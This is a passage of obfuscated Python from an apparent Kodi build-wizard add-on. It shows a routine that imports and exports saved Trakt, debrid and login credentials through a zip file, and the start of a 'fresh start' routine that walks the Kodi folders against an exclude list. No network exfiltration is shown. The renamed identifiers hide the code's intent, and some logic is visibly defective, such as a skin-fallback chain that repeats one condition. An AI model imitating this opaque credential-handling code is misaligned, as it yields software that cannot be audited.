			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Import Data Error![/COLOR]"%(COLOR2 ))#line:4457
			return #line:4458
		OO0O00O0OOOOO0000 =os .path .join (MYBUILDS ,'SaveData.zip')#line:4459
		OO0OO000O00O0000O =xbmcvfs .copy (OO00O0OO0000O0OO0 ,OO0O00O0OOOOO0000 )#line:4460
		wiz .log ("%s"%str (OO0OO000O00O0000O ))#line:4461
		extract .all (xbmc .translatePath (OO0O00O0OOOOO0000 ),OOOOOO0O0OO00000O )#line:4462
		O0O00O0OOO0O0O0OO =os .path .join (OOOOOO0O0OO00000O ,'trakt')#line:4463
		OO0O0O0000OOO00OO =os .path .join (OOOOOO0O0OO00000O ,'login')#line:4464
		O00O00O00O0000O00 =os .path .join (OOOOOO0O0OO00000O ,'debrid')#line:4465
		OO000O000O0OOO000 =0 #line:4466
		if os .path .exists (O0O00O0OOO0O0O0OO ):#line:4467
			OO000O000O0OOO000 +=1 #line:4468
			O00OOOOO00OOOO0OO =os .listdir (O0O00O0OOO0O0O0OO )#line:4469
			if not os .path .exists (traktit .TRAKTFOLD ):os .makedirs (traktit .TRAKTFOLD )#line:4470
			for OO0000O0O0OO0O00O in O00OOOOO00OOOO0OO :#line:4471
				O0000O0OOOO0OO0O0 =os .path .join (traktit .TRAKTFOLD ,OO0000O0O0OO0O00O )#line:4472
				O00O0O0O00O0OOO0O =os .path .join (O0O00O0OOO0O0O0OO ,OO0000O0O0OO0O00O )#line:4473
				if os .path .exists (O0000O0OOOO0OO0O0 ):#line:4474
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,OO0000O0O0OO0O00O ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:4475
					else :os .remove (O0000O0OOOO0OO0O0 )#line:4476
				shutil .copy (O00O0O0O00O0OOO0O ,O0000O0OOOO0OO0O0 )#line:4477
			traktit .importlist ('all')#line:4478
			traktit .traktIt ('restore','all')#line:4479
		if os .path .exists (OO0O0O0000OOO00OO ):#line:4480
			OO000O000O0OOO000 +=1 #line:4481
			O00OOOOO00OOOO0OO =os .listdir (OO0O0O0000OOO00OO )#line:4482
			if not os .path .exists (loginit .LOGINFOLD ):os .makedirs (loginit .LOGINFOLD )#line:4483
			for OO0000O0O0OO0O00O in O00OOOOO00OOOO0OO :#line:4484
				O0000O0OOOO0OO0O0 =os .path .join (loginit .LOGINFOLD ,OO0000O0O0OO0O00O )#line:4485
				O00O0O0O00O0OOO0O =os .path .join (OO0O0O0000OOO00OO ,OO0000O0O0OO0O00O )#line:4486
				if os .path .exists (O0000O0OOOO0OO0O0 ):#line:4487
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,OO0000O0O0OO0O00O ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:4488
					else :os .remove (O0000O0OOOO0OO0O0 )#line:4489
				shutil .copy (O00O0O0O00O0OOO0O ,O0000O0OOOO0OO0O0 )#line:4490
			loginit .importlist ('all')#line:4491
			loginit .loginIt ('restore','all')#line:4492
		if os .path .exists (O00O00O00O0000O00 ):#line:4493
			OO000O000O0OOO000 +=1 #line:4494
			O00OOOOO00OOOO0OO =os .listdir (O00O00O00O0000O00 )#line:4495
			if not os .path .exists (debridit .REALFOLD ):os .makedirs (debridit .REALFOLD )#line:4496
			for OO0000O0O0OO0O00O in O00OOOOO00OOOO0OO :#line:4497
				O0000O0OOOO0OO0O0 =os .path .join (debridit .REALFOLD ,OO0000O0O0OO0O00O )#line:4498
				O00O0O0O00O0OOO0O =os .path .join (O00O00O00O0000O00 ,OO0000O0O0OO0O00O )#line:4499
				if os .path .exists (O0000O0OOOO0OO0O0 ):#line:4500
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,OO0000O0O0OO0O00O ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:4501
					else :os .remove (O0000O0OOOO0OO0O0 )#line:4502
				shutil .copy (O00O0O0O00O0OOO0O ,O0000O0OOOO0OO0O0 )#line:4503
			debridit .importlist ('all')#line:4504
			debridit .debridIt ('restore','all')#line:4505
		wiz .cleanHouse (OOOOOO0O0OO00000O )#line:4506
		wiz .removeFolder (OOOOOO0O0OO00000O )#line:4507
		os .remove (OO0O00O0OOOOO0000 )#line:4508
		if OO000O000O0OOO000 ==0 :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Save Data Import Failed[/COLOR]"%COLOR2 )#line:4509
		else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Save Data Import Complete[/COLOR]"%COLOR2 )#line:4510
	elif O0O000OO0OOO0O000 =='export':#line:4511
		O0OOOOO0O00O00O00 =xbmc .translatePath (MYBUILDS )#line:4512
		O0OO0000000OOOO00 =[traktit .TRAKTFOLD ,debridit .REALFOLD ,loginit .LOGINFOLD ]#line:4513
		traktit .traktIt ('update','all')#line:4514
		loginit .loginIt ('update','all')#line:4515
		debridit .debridIt ('update','all')#line:4516
		OO00O0OO0000O0OO0 =DIALOG .browse (3 ,'[COLOR %s]Select where you wish to export the savedata zip?[/COLOR]'%COLOR2 ,'files','',False ,True ,HOME )#line:4517
		OO00O0OO0000O0OO0 =xbmc .translatePath (OO00O0OO0000O0OO0 )#line:4518
		OO00OOO0O0OO0OOOO =os .path .join (O0OOOOO0O00O00O00 ,'SaveData.zip')#line:4519
		O0O0O000OO0OO00O0 =zipfile .ZipFile (OO00OOO0O0OO0OOOO ,mode ='w')#line:4520
		for OOOOO0OO0O00O0OOO in O0OO0000000OOOO00 :#line:4521
			if os .path .exists (OOOOO0OO0O00O0OOO ):#line:4522
				O00OOOOO00OOOO0OO =os .listdir (OOOOO0OO0O00O0OOO )#line:4523
				for OO000O0OO00O000OO in O00OOOOO00OOOO0OO :#line:4524
					O0O0O000OO0OO00O0 .write (os .path .join (OOOOO0OO0O00O0OOO ,OO000O0OO00O000OO ),os .path .join (OOOOO0OO0O00O0OOO ,OO000O0OO00O000OO ).replace (ADDONDATA ,''),zipfile .ZIP_DEFLATED )#line:4525
		O0O0O000OO0OO00O0 .close ()#line:4526
		if OO00O0OO0000O0OO0 ==O0OOOOO0O00O00O00 :#line:4527
			DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OO00OOO0O0OO0OOOO ))#line:4528
		else :#line:4529
			try :#line:4530
				xbmcvfs .copy (OO00OOO0O0OO0OOOO ,os .path .join (OO00O0OO0000O0OO0 ,'SaveData.zip'))#line:4531
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,os .path .join (OO00O0OO0000O0OO0 ,'SaveData.zip')))#line:4532
			except :#line:4533
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OO00OOO0O0OO0OOOO ))#line:4534
def freshStart (install =None ,over =False ):#line:4539
	if USERNAME =='':#line:4540
		ADDON .openSettings ()#line:4541
		sys .exit ()#line:4542
	OOO00OO00O000O0OO =u_list (SPEEDFILE )#line:4543
	(OOO00OO00O000O0OO )#line:4544
	O000O0OOOO00OOO00 =(wiz .workingURL (OOO00OO00O000O0OO ))#line:4545
	(O000O0OOOO00OOO00 )#line:4546
	if KEEPTRAKT =='true':#line:4547
		traktit .autoUpdate ('all')#line:4548
		wiz .setS ('traktlastsave',str (THREEDAYS ))#line:4549
	if KEEPREAL =='true':#line:4550
		debridit .autoUpdate ('all')#line:4551
		wiz .setS ('debridlastsave',str (THREEDAYS ))#line:4552
	if KEEPLOGIN =='true':#line:4553
		loginit .autoUpdate ('all')#line:4554
		wiz .setS ('loginlastsave',str (THREEDAYS ))#line:4555
	if over ==True :OO00OO00O000O0OOO =1 #line:4556
	elif install =='restore':OO00OO00O000O0OOO =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]בחרת לשחזר את הבילד מקובץ גיבוי קודם"%COLOR2 ,"האם להמשיך?[/COLOR]",nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:4557
	elif install :OO00OO00O000O0OOO =1 #line:4558
	else :OO00OO00O000O0OOO =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]התקנת הבילד"%COLOR2 ,"קודי אנונימוס?[/COLOR]",nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:4559
	if OO00OO00O000O0OOO :#line:4560
		if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']:#line:4561
			O00000O0000O00000 ='skin.confluence'if KODIV <17 else 'skin.estuary'if KODIV <17 else 'skin.anonymous.mod'if KODIV <17 else 'skin.estouchy'if KODIV <17 else 'skin.phenomenal'if KODIV <17 else 'skin.anonymous.nox'if KODIV <17 else 'skin.Premium.mod'#line:4562
			skinSwitch .swapSkins (O00000O0000O00000 )#line:4565
			O0OO000OO0O00OOOO =0 #line:4566
			xbmc .sleep (1000 )#line:4567
			while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O0OO000OO0O00OOOO <150 :#line:4568
				O0OO000OO0O00OOOO +=1 #line:4569
				xbmc .sleep (1000 )#line:4570
				wiz .ebi ('SendAction(Select)')#line:4571
			if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4572
				wiz .ebi ('SendClick(11)')#line:4573
			else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: Skin Swap Timed Out![/COLOR]'%COLOR2 );return False #line:4574
			xbmc .sleep (1000 )#line:4575
		if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']:#line:4576
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: Skin Swap Failed![/COLOR]'%COLOR2 )#line:4577
			return #line:4578
		wiz .addonUpdates ('set')#line:4579
		O00OO000000OO0O00 =os .path .abspath (HOME )#line:4580
		DP .create (ADDONTITLE ,"[COLOR %s]מחשב קבצים ותיקיות"%COLOR2 ,'','אנא המתן![/COLOR]')#line:4581
		O0O000000OOOOOOO0 =sum ([len (O000OO0O0OO000000 )for O0OOOOO0000OO0OOO ,OO00OO0OO0O000000 ,O000OO0O0OO000000 in os .walk (O00OO000000OO0O00 )]);O0000O00O00OO0O0O =0 #line:4582
		DP .update (0 ,"[COLOR %s]Gathering Excludes list."%COLOR2 )#line:4583
		EXCLUDES .append ('My_Builds')#line:4584
		EXCLUDES .append ('archive_cache')#line:4585
		EXCLUDES .append ('script.module.requests')#line:4586
		EXCLUDES .append ('myfav.anon')#line:4587
		if KEEPREPOS =='true':#line:4588
			OOOO0OOO0OO0O0O0O =glob .glob (os .path .join (ADDONS ,'repo*/'))#line:4589
			for O0OOOOO0OO00O00OO in OOOO0OOO0OO0O0O0O :#line:4590
				O000OOOOO00O0OO00 =os .path .split (O0OOOOO0OO00O00OO [:-1 ])[1 ]#line:4591
				if not O000OOOOO00O0OO00 ==EXCLUDES :#line:4592
					EXCLUDES .append (O000OOOOO00O0OO00 )#line:4593
		if KEEPSUPER =='true':#line:4594
			EXCLUDES .append ('plugin.program.super.favourites')#line:4595
		if KEEPMOVIELIST =='true':#line:4596
			EXCLUDES .append ('plugin.video.metalliq')#line:4597
		if KEEPMOVIELIST =='true':#line:4598
			EXCLUDES .append ('plugin.video.anonymous.wall')#line:4599
		if KEEPADDONS =='true':#line:4600
			EXCLUDES .append ('addons')#line:4601
		if KEEPADDONS =='true':#line:4602
			EXCLUDES .append ('addon_data')#line:4603
		EXCLUDES .append ('plugin.video.elementum')#line:4606
		EXCLUDES .append ('script.elementum.burst')#line:4607
		EXCLUDES .append ('script.elementum.burst-master')#line:4608
		EXCLUDES .append ('plugin.video.quasar')#line:4609
		EXCLUDES .append ('script.quasar.burst')#line:4610
		EXCLUDES .append ('skin.estuary')#line:4611
		if KEEPWHITELIST =='true':#line:4614
			OOOO0O0OO0OO000OO =''#line:4615
			O00O00OOO00O0000O =wiz .whiteList ('read')#line:4616
			if len (O00O00OOO00O0000O )>0 :#line:4617
				for O0OOOOO0OO00O00OO in O00O00OOO00O0000O :#line:4618
					try :OOOOOO000O0OOOOOO ,OOOO0O0O0OO00O0OO ,O00OO0OOO00OO0OO0 =O0OOOOO0OO00O00OO #line:4619
					except :pass #line:4620
					if O00OO0OOO00OO0OO0 .startswith ('pvr'):OOOO0O0OO0OO000OO =OOOO0O0O0OO00O0OO #line:4621
					O0O000O0OOOOO0000 =dependsList (O00OO0OOO00OO0OO0 )#line:4622
					for OOOO00OOO0OO0O0O0 in O0O000O0OOOOO0000 :#line:4623
						if not OOOO00OOO0OO0O0O0 in EXCLUDES :#line:4624
							EXCLUDES .append (OOOO00OOO0OO0O0O0 )#line:4625
						OOO00OOO0OO0OO0O0 =dependsList (OOOO00OOO0OO0O0O0 )#line:4626
						for OO0OOOO0O000OO0O0 in OOO00OOO0OO0OO0O0 :#line:4627
							if not OO0OOOO0O000OO0O0 in EXCLUDES :#line:4628
								EXCLUDES .append (OO0OOOO0O000OO0O0 )#line:4629
					if not O00OO0OOO00OO0OO0 in EXCLUDES :#line:4630
						EXCLUDES .append (O00OO0OOO00OO0OO0 )#line:4631
				if not OOOO0O0OO0OO000OO =='':wiz .setS ('pvrclient',O00OO0OOO00OO0OO0 )#line:4632
		if wiz .getS ('pvrclient')=='':#line:4633
			for O0OOOOO0OO00O00OO in EXCLUDES :#line:4634
				if O0OOOOO0OO00O00OO .startswith ('pvr'):#line:4635
					wiz .setS ('pvrclient',O0OOOOO0OO00O00OO )#line:4636
		DP .update (0 ,"[COLOR %s]מנקה קבצים ותיקיות:"%COLOR2 )#line:4637
		OO0O0O0O00OO00000 =wiz .latestDB ('Addons')#line:4638
		for OO0O00O0OOO0OO000 ,O00O00O0OOO00O00O ,OOO00O0O00O00O000 in os .walk (O00OO000000OO0O00 ,topdown =True ):#line:4639
			O00O00O0OOO00O00O [:]=[OOO0OOO00OO0OOOOO for OOO0OOO00OO0OOOOO in O00O00O0OOO00O00O if OOO0OOO00OO0OOOOO not in EXCLUDES ]#line:4640
			for OOOOOO000O0OOOOOO in OOO00O0O00O00O000 :#line:4641
				O0000O00O00OO0O0O +=1 #line:4642
				O00OO0OOO00OO0OO0 =OO0O00O0OOO0OO000 .replace ('/','\\').split ('\\')#line:4643
				O0OO000OO0O00OOOO =len (O00OO0OOO00OO0OO0 )-1 #line:4645
				if O00OO0OOO00OO0OO0 [O0OO000OO0O00OOOO -2 ]=='userdata'and O00OO0OOO00OO0OO0 [O0OO000OO0O00OOOO -1 ]=='addon_data'and 'script.skinshortcuts'in O00OO0OOO00OO0OO0 [O0OO000OO0O00OOOO ]and KEEPSKIN =='true':wiz .log ("Keep Skin: %s"%os .path .join (OO0O00O0OOO0OO000 ,OOOOOO000O0OOOOOO ),xbmc .LOGNOTICE )#line:4646
				elif OOOOOO000O0OOOOOO =='MyVideos99.db'and O00OO0OOO00OO0OO0 [O0OO000OO0O00OOOO -1 ]=='userdata'and O00OO0OOO00OO0OO0 [O0OO000OO0O00OOOO -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (OO0O00O0OOO0OO000 ,OOOOOO000O0OOOOOO ),xbmc .LOGNOTICE )#line:4647
				elif OOOOOO000O0OOOOOO =='MyVideos107.db'and O00OO0OOO00OO0OO0 [O0OO000OO0O00OOOO -1 ]=='userdata'and O00OO0OOO00OO0OO0 [O0OO000OO0O00OOOO -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (OO0O00O0OOO0OO000 ,OOOOOO000O0OOOOOO ),xbmc .LOGNOTICE )#line:4648
				elif OOOOOO000O0OOOOOO =='MyVideos116.db'and O00OO0OOO00OO0OO0 [O0OO000OO0O00OOOO -1 ]=='userdata'and O00OO0OOO00OO0OO0 [O0OO000OO0O00OOOO -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (OO0O00O0OOO0OO000 ,OOOOOO000O0OOOOOO ),xbmc .LOGNOTICE )#line:4649
				elif OOOOOO000O0OOOOOO =='MyVideos99.db'and O00OO0OOO00OO0OO0 [O0OO000OO0O00OOOO -1 ]=='userdata'and O00OO0OOO00OO0OO0 [O0OO000OO0O00OOOO -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (OO0O00O0OOO0OO000 ,OOOOOO000O0OOOOOO ),xbmc .LOGNOTICE )#line:4650
				elif OOOOOO000O0OOOOOO =='MyVideos107.db'and O00OO0OOO00OO0OO0 [O0OO000OO0O00OOOO -1 ]=='userdata'and O00OO0OOO00OO0OO0 [O0OO000OO0O00OOOO -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (OO0O00O0OOO0OO000 ,OOOOOO000O0OOOOOO ),xbmc .LOGNOTICE )#line:4651
				elif OOOOOO000O0OOOOOO =='MyVideos116.db'and O00OO0OOO00OO0OO0 [O0OO000OO0O00OOOO -1 ]=='userdata'and O00OO0OOO00OO0OO0 [O0OO000OO0O00OOOO -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (OO0O00O0OOO0OO000 ,OOOOOO000O0OOOOOO ),xbmc .LOGNOTICE )#line:4652
				elif O00OO0OOO00OO0OO0 [O0OO000OO0O00OOOO -2 ]=='userdata'and O00OO0OOO00OO0OO0 [O0OO000OO0O00OOOO -1 ]=='addon_data'and 'plugin.video.anonymous.wall'in O00OO0OOO00OO0OO0 [O0OO000OO0O00OOOO ]and KEEPMOVIELIST =='true':wiz .log ("Keep View: %s"%os .path .join (OO0O00O0OOO0OO000 ,OOOOOO000O0OOOOOO ),xbmc .LOGNOTICE )#line:4653
				elif O00OO0OOO00OO0OO0 [O0OO000OO0O00OOOO -2 ]=='userdata'and O00OO0OOO00OO0OO0 [O0OO000OO0O00OOOO -1 ]=='addon_data'and 'skin.anonymous.mod'in O00OO0OOO00OO0OO0 [O0OO000OO0O00OOOO ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (OO0O00O0OOO0OO000 ,OOOOOO000O0OOOOOO ),xbmc .LOGNOTICE )#line:4654
				elif O00OO0OOO00OO0OO0 [O0OO000OO0O00OOOO -2 ]=='userdata'and O00OO0OOO00OO0OO0 [O0OO000OO0O00OOOO -1 ]=='addon_data'and 'skin.Premium.mod'in O00OO0OOO00OO0OO0 [O0OO000OO0O00OOOO ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (OO0O00O0OOO0OO000 ,OOOOOO000O0OOOOOO ),xbmc .LOGNOTICE )#line:4655
				elif O00OO0OOO00OO0OO0 [O0OO000OO0O00OOOO -2 ]=='userdata'and O00OO0OOO00OO0OO0 [O0OO000OO0O00OOOO -1 ]=='addon_data'and 'skin.anonymous.nox'in O00OO0OOO00OO0OO0 [O0OO000OO0O00OOOO ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (OO0O00O0OOO0OO000 ,OOOOOO000O0OOOOOO ),xbmc .LOGNOTICE )#line:4656
				elif O00OO0OOO00OO0OO0 [O0OO000OO0O00OOOO -2 ]=='userdata'and O00OO0OOO00OO0OO0 [O0OO000OO0O00OOOO -1 ]=='addon_data'and 'skin.phenomenal'in O00OO0OOO00OO0OO0 [O0OO000OO0O00OOOO ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (OO0O00O0OOO0OO000 ,OOOOOO000O0OOOOOO ),xbmc .LOGNOTICE )#line:4657
				elif O00OO0OOO00OO0OO0 [O0OO000OO0O00OOOO -2 ]=='userdata'and O00OO0OOO00OO0OO0 [O0OO000OO0O00OOOO -1 ]=='addon_data'and 'plugin.video.metalliq'in O00OO0OOO00OO0OO0 [O0OO000OO0O00OOOO ]and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (OO0O00O0OOO0OO000 ,OOOOOO000O0OOOOOO ),xbmc .LOGNOTICE )#line:4658
				elif O00OO0OOO00OO0OO0 [O0OO000OO0O00OOOO -2 ]=='userdata'and O00OO0OOO00OO0OO0 [O0OO000OO0O00OOOO -1 ]=='addon_data'and 'skin.titan'in O00OO0OOO00OO0OO0 [O0OO000OO0O00OOOO ]and KEEPSKIN3 =='true':wiz .log ("Install titan: %s"%os .path .join (OO0O00O0OOO0OO000 ,OOOOOO000O0OOOOOO ),xbmc .LOGNOTICE )#line:4660
				elif O00OO0OOO00OO0OO0 [O0OO000OO0O00OOOO -2 ]=='userdata'and O00OO0OOO00OO0OO0 [O0OO000OO0O00OOOO -1 ]=='addon_data'and 'pvr.iptvsimple'in O00OO0OOO00OO0OO0 [O0OO000OO0O00OOOO ]and KEEPPVR =='true':wiz .log ("Keep Pvr: %s"%os .path .join (OO0O00O0OOO0OO000 ,OOOOOO000O0OOOOOO ),xbmc .LOGNOTICE )#line:4661
				elif OOOOOO000O0OOOOOO =='sources.xml'and O00OO0OOO00OO0OO0 [-1 ]=='userdata'and KEEPSOURCES =='true':wiz .log ("Keep Sources: %s"%os .path .join (OO0O00O0OOO0OO000 ,OOOOOO000O0OOOOOO ),xbmc .LOGNOTICE )#line:4663
				elif OOOOOO000O0OOOOOO =='quicknav.DATA.xml'and O00OO0OOO00OO0OO0 [O0OO000OO0O00OOOO -2 ]=='userdata'and O00OO0OOO00OO0OO0 [O0OO000OO0O00OOOO -1 ]=='addon_data'and 'script.skinshortcuts'in O00OO0OOO00OO0OO0 [O0OO000OO0O00OOOO ]and KEEPTVLIST =='true':wiz .log ("Keep Tv List: %s"%os .path .join (OO0O00O0OOO0OO000 ,OOOOOO000O0OOOOOO ),xbmc .LOGNOTICE )#line:4666
				elif OOOOOO000O0OOOOOO =='x1101.DATA.xml'and O00OO0OOO00OO0OO0 [O0OO000OO0O00OOOO -2 ]=='userdata'and O00OO0OOO00OO0OO0 [O0OO000OO0O00OOOO -1 ]=='addon_data'and 'script.skinshortcuts'in O00OO0OOO00OO0OO0 [O0OO000OO0O00OOOO ]and KEEPHUBMOVIE =='true':wiz .log ("Keep Hub Movie: %s"%os .path .join (OO0O00O0OOO0OO000 ,OOOOOO000O0OOOOOO ),xbmc .LOGNOTICE )#line:4667
				elif OOOOOO000O0OOOOOO =='b-srtym-b.DATA.xml'and O00OO0OOO00OO0OO0 [O0OO000OO0O00OOOO -2 ]=='userdata'and O00OO0OOO00OO0OO0 [O0OO000OO0O00OOOO -1 ]=='addon_data'and 'script.skinshortcuts'in O00OO0OOO00OO0OO0 [O0OO000OO0O00OOOO ]and KEEPHUBMOVIE =='true':wiz .log ("Keep Hub Movie: %s"%os .path .join (OO0O00O0OOO0OO000 ,OOOOOO000O0OOOOOO ),xbmc .LOGNOTICE )#line:4668
				elif OOOOOO000O0OOOOOO =='x1102.DATA.xml'and O00OO0OOO00OO0OO0 [O0OO000OO0O00OOOO -2 ]=='userdata'and O00OO0OOO00OO0OO0 [O0OO000OO0O00OOOO -1 ]=='addon_data'and 'script.skinshortcuts'in O00OO0OOO00OO0OO0 [O0OO000OO0O00OOOO ]and KEEPHUBTVSHOW =='true':wiz .log ("Keep Hub Tvshow: %s"%os .path .join (OO0O00O0OOO0OO000 ,OOOOOO000O0OOOOOO ),xbmc .LOGNOTICE )#line:4669
				elif OOOOOO000O0OOOOOO =='b-sdrvt-b.DATA.xml'and O00OO0OOO00OO0OO0 [O0OO000OO0O00OOOO -2 ]=='userdata'and O00OO0OOO00OO0OO0 [O0OO000OO0O00OOOO -1 ]=='addon_data'and 'script.skinshortcuts'in O00OO0OOO00OO0OO0 [O0OO000OO0O00OOOO ]and KEEPHUBTVSHOW =='true':wiz .log ("Keep Hub Tvshow: %s"%os .path .join (OO0O00O0OOO0OO000 ,OOOOOO000O0OOOOOO ),xbmc .LOGNOTICE )#line:4670
				elif OOOOOO000O0OOOOOO =='x1112.DATA.xml'and O00OO0OOO00OO0OO0 [O0OO000OO0O00OOOO -2 ]=='userdata'and O00OO0OOO00OO0OO0 [O0OO000OO0O00OOOO -1 ]=='addon_data'and 'script.skinshortcuts'in O00OO0OOO00OO0OO0 [O0OO000OO0O00OOOO ]and KEEPHUBTV =='true':wiz .log ("Keep Hub Tv: %s"%os .path .join (OO0O00O0OOO0OO000 ,OOOOOO000O0OOOOOO ),xbmc .LOGNOTICE )#line:4671
				elif OOOOOO000O0OOOOOO =='b-tlvvyzyh-b.DATA.xml'and O00OO0OOO00OO0OO0 [O0OO000OO0O00OOOO -2 ]=='userdata'and O00OO0OOO00OO0OO0 [O0OO000OO0O00OOOO -1 ]=='addon_data'and 'script.skinshortcuts'in O00OO0OOO00OO0OO0 [O0OO000OO0O00OOOO ]and KEEPHUBTV =='true':wiz .log ("Keep Hub Tv: %s"%os .path .join (OO0O00O0OOO0OO000 ,OOOOOO000O0OOOOOO ),xbmc .LOGNOTICE )#line:4672
				elif OOOOOO000O0OOOOOO =='x1111.DATA.xml'and O00OO0OOO00OO0OO0 [O0OO000OO0O00OOOO -2 ]=='userdata'and O00OO0OOO00OO0OO0 [O0OO000OO0O00OOOO -1 ]=='addon_data'and 'script.skinshortcuts'in O00OO0OOO00OO0OO0 [O0OO000OO0O00OOOO ]and KEEPHUBVOD =='true':wiz .log ("Keep Hub Vod: %s"%os .path .join (OO0O00O0OOO0OO000 ,OOOOOO000O0OOOOOO ),xbmc .LOGNOTICE )#line:4673
				elif OOOOOO000O0OOOOOO =='b-tvknyshrly-b.DATA.xml'and O00OO0OOO00OO0OO0 [O0OO000OO0O00OOOO -2 ]=='userdata'and O00OO0OOO00OO0OO0 [O0OO000OO0O00OOOO -1 ]=='addon_data'and 'script.skinshortcuts'in O00OO0OOO00OO0OO0 [O0OO000OO0O00OOOO ]and KEEPHUBVOD =='true':wiz .log ("Keep Hub Vod: %s"%os .path .join (OO0O00O0OOO0OO000 ,OOOOOO000O0OOOOOO ),xbmc .LOGNOTICE )#line:4674
				elif OOOOOO000O0OOOOOO =='x1110.DATA.xml'and O00OO0OOO00OO0OO0 [O0OO000OO0O00OOOO -2 ]=='userdata'and O00OO0OOO00OO0OO0 [O0OO000OO0O00OOOO -1 ]=='addon_data'and 'script.skinshortcuts'in O00OO0OOO00OO0OO0 [O0OO000OO0O00OOOO ]and KEEPHUBKIDS =='true':wiz .log ("Keep Hub Kids: %s"%os .path .join (OO0O00O0OOO0OO000 ,OOOOOO000O0OOOOOO ),xbmc .LOGNOTICE )#line:4675
				elif OOOOOO000O0OOOOOO =='b-yldym-b.DATA.xml'and O00OO0OOO00OO0OO0 [O0OO000OO0O00OOOO -2 ]=='userdata'and O00OO0OOO00OO0OO0 [O0OO000OO0O00OOOO -1 ]=='addon_data'and 'script.skinshortcuts'in O00OO0OOO00OO0OO0 [O0OO000OO0O00OOOO ]and KEEPHUBKIDS =='true':wiz .log ("Keep Hub Kids: %s"%os .path .join (OO0O00O0OOO0OO000 ,OOOOOO000O0OOOOOO ),xbmc .LOGNOTICE )#line:4676
				elif OOOOOO000O0OOOOOO =='x1114.DATA.xml'and O00OO0OOO00OO0OO0 [O0OO000OO0O00OOOO -2 ]=='userdata'and O00OO0OOO00OO0OO0 [O0OO000OO0O00OOOO -1 ]=='addon_data'and 'script.skinshortcuts'in O00OO0OOO00OO0OO0 [O0OO000OO0O00OOOO ]and KEEPHUBMUSIC =='true':wiz .log ("Keep Hub Music: %s"%os .path .join (OO0O00O0OOO0OO000 ,OOOOOO000O0OOOOOO ),xbmc .LOGNOTICE )#line:4677
				elif OOOOOO000O0OOOOOO =='b-mvzyqh-b.DATA.xml'and O00OO0OOO00OO0OO0 [O0OO000OO0O00OOOO -2 ]=='userdata'and O00OO0OOO00OO0OO0 [O0OO000OO0O00OOOO -1 ]=='addon_data'and 'script.skinshortcuts'in O00OO0OOO00OO0OO0 [O0OO000OO0O00OOOO ]and KEEPHUBMUSIC =='true':wiz .log ("Keep Hub Music: %s"%os .path .join (OO0O00O0OOO0OO000 ,OOOOOO000O0OOOOOO ),xbmc .LOGNOTICE )#line:4678
				elif OOOOOO000O0OOOOOO =='mainmenu.DATA.xml'and O00OO0OOO00OO0OO0 [O0OO000OO0O00OOOO -2 ]=='userdata'and O00OO0OOO00OO0OO0 [O0OO000OO0O00OOOO -1 ]=='addon_data'and 'script.skinshortcuts'in O00OO0OOO00OO0OO0 [O0OO000OO0O00OOOO ]and KEEPHUBMENU =='true':wiz .log ("Keep Hub Menu: %s"%os .path .join (OO0O00O0OOO0OO000 ,OOOOOO000O0OOOOOO ),xbmc .LOGNOTICE )#line:4679
